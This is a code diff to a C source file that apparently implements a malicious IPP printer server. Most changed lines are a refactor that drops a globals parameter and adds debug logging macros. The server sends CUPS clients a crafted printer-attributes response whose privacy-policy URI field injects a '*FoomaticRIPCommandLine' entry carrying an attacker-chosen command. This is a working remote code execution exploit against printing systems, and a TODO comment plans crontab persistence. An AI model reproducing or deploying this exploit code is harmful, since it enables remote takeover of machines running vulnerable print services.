@@ -7,6 +7,7 @@
 #include <pthread.h>
 
 #include "ipp_server.h"
+#include "utils.h"
 
 #define TARGET_PORT 631
 #define BUFFER_SIZE 4096
@@ -17,7 +18,6 @@
 typedef struct thread_args{
     int client_socket;
     char *server_ip;
-    Globals *global;
 }TArgs;
 
 typedef struct ipp_request_info{
@@ -27,27 +27,27 @@ typedef struct ipp_request_info{
 }IppReqInfo;
 
 // Function to locate the ipp data within the received HTTP request
-char* find_ipp_body(Globals *global, char** http_request) {
+char* find_ipp_body(char** http_request) {
     char* body_start = NULL;
 
     // Look for the "Content-Length" header in the HTTP request
     char* content_length_header = global->strstr(*http_request, "Content-Length: ");
     if (!content_length_header) {
-        global->perror("Content-Length header not found.\n");
+        DEBUG_LOG_ERR("[IPP] Content-Length header not found.\n");
         return NULL;
     }
 
     // Extract the content length
     int content_length = 0;
     if (global->sscanf(content_length_header, "Content-Length: %d", &content_length) != 1) {
-        global->fprintf(global->stderr, "Invalid Content-Length header.\n");
+        DEBUG_LOG_ERR("[IPP] Invalid Content-Length header.\n");
         return NULL;
     }
 
     // Find the double newline that marks the end of the headers
     char* header_end = global->strstr(*http_request, "\r\n\r\n");
     if (!header_end) {
-        global->fprintf(global->stderr, "Invalid HTTP request format.\n");
+        DEBUG_LOG_ERR("[IPP] Invalid HTTP request format.\n");
         return NULL;
     }
     header_end += 4;  // Skip the newline characters
@@ -56,7 +56,7 @@ char* find_ipp_body(Globals *global, char** http_request) {
 }
 
 // add a string attribute to the ipp body
-int ipp_add_string(Globals * global, char *ipp, int tag, char* attribute, char* value){
+int ipp_add_string(char *ipp, int tag, char* attribute, char* value){
     int offset = 0;
     // write tag
     ipp[offset++] = tag; 
@@ -83,7 +83,7 @@ int ipp_add_string(Globals * global, char *ipp, int tag, char* attribute, char* 
 }
 
 // add an integer attribute to the ipp body
-int ipp_add_integer(Globals * global, char *ipp, int tag, char * attribute, uint32_t value){
+int ipp_add_integer(char *ipp, int tag, char * attribute, uint32_t value){
     int offset = 0;
 
     // write tag
@@ -112,7 +112,7 @@ int ipp_add_integer(Globals * global, char *ipp, int tag, char * attribute, uint
 }
 
 // add a boolean attribute to the ipp body
-int ipp_add_boolean(Globals * global, char *ipp, char * attribute, char value){
+int ipp_add_boolean(char *ipp, char * attribute, char value){
     int offset = 0;
 
     // write boolean tag
@@ -138,11 +138,11 @@ int ipp_add_boolean(Globals * global, char *ipp, char * attribute, char value){
 }
 
 // Function to create an IPP response using libcups
-unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp_request_info *request_info, char *rce_command) {
+unsigned char* create_ipp_body(size_t* response_size, struct ipp_request_info *request_info, char *rce_command) {
     // Allocate buffer
     unsigned char* response = global->malloc(MAX_RESPONSE_SIZE);
     if (!response) {
-        global->perror("malloc failed");
+        DEBUG_LOG_ERR("[IPP] CreateIppBody malloc failed\n");
         return NULL;
     }
     global->memset(response, 0, MAX_RESPONSE_SIZE); // Initialize memory to zero
@@ -168,45 +168,45 @@ unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp
     // Start Operation Attributes
     response[offset++] = IPP_TAG_OPERATION; // Operation Attributes Tag
 
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_CHARSET, "attributes-charset", "utf-8");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_LANGUAGE, "attributes-natural-language", "en");
+    offset += ipp_add_string(&response[offset], IPP_TAG_CHARSET, "attributes-charset", "utf-8");
+    offset += ipp_add_string(&response[offset], IPP_TAG_LANGUAGE, "attributes-natural-language", "en");
 
     // Start Printer Attributes
     response[offset++] = IPP_TAG_PRINTER; // Printer Attributes Tag
 
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_URI, "printer-uri-supported", "ipp://localhost:666/printer");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "uri-authentication-supported", "none");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "uri-security-supported", "none");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_NAME, "printer-name", "Main Printer");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_TEXT, "printer-info", "Main Printer Info");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_TEXT, "printer-make-and-model", "HP 0.00");
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_INTEGER, "queued-job-count", 666);
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_ENUM, "printer-state", IPP_PSTATE_IDLE);
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "printer-state-reasons", "none");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "ipp-versions-supported", ipp_version);
+    offset += ipp_add_string(&response[offset], IPP_TAG_URI, "printer-uri-supported", "ipp://localhost:666/printer");
+    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "uri-authentication-supported", "none");
+    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "uri-security-supported", "none");
+    offset += ipp_add_string(&response[offset], IPP_TAG_NAME, "printer-name", "Main Printer");
+    offset += ipp_add_string(&response[offset], IPP_TAG_TEXT, "printer-info", "Main Printer Info");
+    offset += ipp_add_string(&response[offset], IPP_TAG_TEXT, "printer-make-and-model", "HP 0.00");
+    offset += ipp_add_integer(&response[offset], IPP_TAG_INTEGER, "queued-job-count", 666);
+    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "printer-state", IPP_PSTATE_IDLE);
+    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "printer-state-reasons", "none");
+    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "ipp-versions-supported", ipp_version);
     
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_ENUM, "operations-supported", IPP_OP_PRINT_JOB);
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_ENUM, "", IPP_OP_VALIDATE_JOB);
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_ENUM, "", IPP_OP_CANCEL_JOB);
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_ENUM, "", IPP_OP_GET_JOB_ATTRIBUTES);
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_ENUM, "", IPP_OP_GET_PRINTER_ATTRIBUTES);
-    offset += ipp_add_boolean(global, &response[offset], "multiple-document-jobs-supported", (char)0);
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_CHARSET, "charset-configured", "utf-8");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_CHARSET, "charset-supported", "utf-8");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_LANGUAGE, "natural-language-configured", "en");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_LANGUAGE, "generated-natural-language-supported", "en");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_MIMETYPE, "document-format-default", "application/pdf");
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_MIMETYPE, "document-format-supported", "application/pdf");
-    offset += ipp_add_boolean(global, &response[offset], "printer-is-accepting-jobs", (char)1);
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_INTEGER, "queued-job-count", 666);
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "pdl-override-supported", "not-attempted");
-    offset += ipp_add_integer(global, &response[offset], IPP_TAG_INTEGER, "printer-up-time", 420);
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_KEYWORD, "compression-supported", "none");
+    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "operations-supported", IPP_OP_PRINT_JOB);
+    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_VALIDATE_JOB);
+    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_CANCEL_JOB);
+    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_GET_JOB_ATTRIBUTES);
+    offset += ipp_add_integer(&response[offset], IPP_TAG_ENUM, "", IPP_OP_GET_PRINTER_ATTRIBUTES);
+    offset += ipp_add_boolean(&response[offset], "multiple-document-jobs-supported", (char)0);
+    offset += ipp_add_string(&response[offset], IPP_TAG_CHARSET, "charset-configured", "utf-8");
+    offset += ipp_add_string(&response[offset], IPP_TAG_CHARSET, "charset-supported", "utf-8");
+    offset += ipp_add_string(&response[offset], IPP_TAG_LANGUAGE, "natural-language-configured", "en");
+    offset += ipp_add_string(&response[offset], IPP_TAG_LANGUAGE, "generated-natural-language-supported", "en");
+    offset += ipp_add_string(&response[offset], IPP_TAG_MIMETYPE, "document-format-default", "application/pdf");
+    offset += ipp_add_string(&response[offset], IPP_TAG_MIMETYPE, "document-format-supported", "application/pdf");
+    offset += ipp_add_boolean(&response[offset], "printer-is-accepting-jobs", (char)1);
+    offset += ipp_add_integer(&response[offset], IPP_TAG_INTEGER, "queued-job-count", 666);
+    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "pdl-override-supported", "not-attempted");
+    offset += ipp_add_integer(&response[offset], IPP_TAG_INTEGER, "printer-up-time", 420);
+    offset += ipp_add_string(&response[offset], IPP_TAG_KEYWORD, "compression-supported", "none");
 
     char *payload = global->malloc(MAX_PAYLOAD_SIZE);
     global->snprintf(payload, MAX_PAYLOAD_SIZE, "https//www.google.com/\"\n*FoomaticRIPCommandLine: \"%s\"\n*cupsFilter2 : \"*/* application/vnd.cups-postscript 0 foomatic-rip", rce_command);
-    global->printf("Sending payload: %s\n", payload);
-    offset += ipp_add_string(global, &response[offset], IPP_TAG_URI, "printer-privacy-policy-uri", payload);
+    DEBUG_LOG("[IPP] Sending payload: \n%s\n", payload);
+    offset += ipp_add_string(&response[offset], IPP_TAG_URI, "printer-privacy-policy-uri", payload);
     global->free(payload);
 
     // End of Attributes Tag
@@ -217,9 +217,9 @@ unsigned char* create_ipp_body(Globals*global, size_t* response_size, struct ipp
     return response;
 }
 
-unsigned char* create_http_body(Globals* global, size_t* total_response_size, struct ipp_request_info *request_info, char* rce_command) {
+unsigned char* create_http_body(size_t* total_response_size, struct ipp_request_info *request_info, char* rce_command) {
     size_t ipp_size;
-    unsigned char* ipp_response = create_ipp_body(global, &ipp_size, request_info, rce_command);
+    unsigned char* ipp_response = create_ipp_body(&ipp_size, request_info, rce_command);
     if (!ipp_response) {
         return NULL;
     }
@@ -238,7 +238,7 @@ unsigned char* create_http_body(Globals* global, size_t* total_response_size, st
     // Allocate buffer for full HTTP response
     unsigned char* full_response = global->malloc(*total_response_size);
     if (!full_response) {
-        global->perror("Failed to allocate buffer for HTTP response");
+        DEBUG_LOG_ERR("[IPP] Failed to allocate buffer for HTTP response\n");
         global->free(ipp_response);
         return NULL;
     }
@@ -254,10 +254,10 @@ unsigned char* create_http_body(Globals* global, size_t* total_response_size, st
 }
 
 
-void load_ipp_request_infos(Globals * global, IppReqInfo * request_info, char* received_data){
+void load_ipp_request_infos(IppReqInfo * request_info, char* received_data){
     // locate the ipp_version and request_id within the request
     char ** buffer_ptr = &received_data;
-    char* ipp_body = find_ipp_body(global, buffer_ptr);
+    char* ipp_body = find_ipp_body(buffer_ptr);
     int ipp_version_major = *(char*)ipp_body;
     int ipp_version_minor = *(char*)(ipp_body+1);
     uint32_t raw_request_id = *(uint32_t*)(ipp_body+4);
@@ -274,20 +274,19 @@ void* handle_client(void* arg) {
     TArgs *args = (TArgs*) arg; 
     int client_sock = args->client_socket;
     char *server_ip = args->server_ip;
-    Globals *global = args->global;
     global->free(arg);
 
     // Receive client request
     char buffer[BUFFER_SIZE];
     int bytes_received = global->recv(client_sock, buffer, sizeof(buffer), 0);
     if (bytes_received < 0) {
-        global->perror("recv failed");
+        DEBUG_LOG_ERR("[IPP] recv failed\n");
         global->close(client_sock);
         return NULL;
     }
 
     IppReqInfo *request_info = global->malloc(sizeof(IppReqInfo));
-    load_ipp_request_infos(global, request_info, buffer);
+    load_ipp_request_infos(request_info, buffer);
 
     char *rce_command = global->malloc(MAX_RCE_SIZE);
     // TODO: add process to crontab @reboot
@@ -295,7 +294,7 @@ void* handle_client(void* arg) {
 
     // Create and send IPP response
     size_t response_size;
-    unsigned char* ipp_response = create_http_body(global, &response_size, request_info, rce_command);
+    unsigned char* ipp_response = create_http_body(&response_size, request_info, rce_command);
     global->free(request_info);
     global->free(rce_command);
     if (!ipp_response) {
@@ -310,12 +309,13 @@ void* handle_client(void* arg) {
 }
 
 // Main function to start the server
-int serve(Globals * global) {
+int serve(Globals * glob) {
+    global = glob;
 
     // Set up the server to listen for incoming connections
     int server_sock = global->socket(AF_INET, SOCK_STREAM, 0);
     if (server_sock < 0) {
-        global->perror("Socket creation failed");
+        DEBUG_LOG_ERR("[IPP] Socket creation failed\n");
         return 1;
     }
 
@@ -327,29 +327,29 @@ int serve(Globals * global) {
 
     int yes=1;
     if(global->setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &yes, sizeof(yes)) == -1){
-        global->perror("Setsockopt failed...\n");
+        DEBUG_LOG_ERR("[IPP] Setsockopt failed...\n");
         global->exit(0);
     }
 
     if (global->bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        global->fprintf(global->stderr, "Bind failed");
+        global->fprintf(global->stderr, "[IPP] Bind failed");
         global->close(server_sock);
         return 1;
     }
 
     if (global->listen(server_sock, 10) < 0) {
-        global->perror("Listen failed");
+        DEBUG_LOG_ERR("[IPP] Listen failed");
         global->close(server_sock);
         return 1;
     }
 
-    global->printf("IPP-Server listening on port %d...\n", global->ipp_server_port);
+    DEBUG_LOG("[IPP] Server listening on port %d...\n", global->ipp_server_port);
 
     // Start the server to handle incoming connections
     while (1) {
         int client_sock = global->accept(server_sock, NULL, NULL);
         if (client_sock < 0) {
-            global->perror("Accept failed");
+            DEBUG_LOG_ERR("[IPP] Accept failed");
             continue;
         }
 
@@ -360,7 +360,7 @@ int serve(Globals * global) {
         if (global->getsockname(client_sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
             global->inet_ntop(AF_INET, &local_addr.sin_addr, local_ip, sizeof(local_ip));
         } else {
-            global->perror("getsockname failed");
+            DEBUG_LOG_ERR("[IPP] getsockname failed\n");
             continue;
         }
 
@@ -368,7 +368,6 @@ int serve(Globals * global) {
         TArgs *args = global->malloc(sizeof(TArgs));
         args->client_socket = client_sock;
         args->server_ip = local_ip;
-        args->global = global;
         global->pthread_create(&thread, NULL, handle_client, args);
         global->pthread_detach(thread);
     }
